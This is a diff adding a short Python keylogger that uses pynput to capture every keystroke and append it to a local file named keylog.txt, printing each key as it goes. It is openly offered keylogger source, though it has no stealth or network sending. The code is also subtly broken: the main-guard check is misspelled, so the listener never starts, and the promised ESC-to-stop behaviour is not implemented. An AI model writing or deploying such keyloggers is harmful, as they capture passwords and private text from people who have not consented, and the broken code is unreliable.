@@ -1,0 +1,21 @@
+from pynput import keyboard
+
+# Function to handle key presses
+def keyPressed(key):
+    try:
+        # Log the character if it's a regular key
+        char = key.char
+        print(f"Key pressed: {char}")
+        with open("keylog.txt", 'a') as logkey:
+            logkey.write(char)
+    except AttributeError:
+        # Log special keysffd
+        print(f"Special key pressed: {key}")
+        with open("keylog.txt", 'a') as logkey:
+            logkey.write(f'[{key}]\n')
+
+# Main program to start listening to keyboard events
+if _name_ == "_main_":
+    print("Keylogger started. Press ESC to stop.")
+    with keyboard.Listener(on_press=keyPressed) as listener:
+        listener.join()  # Keep the listener running
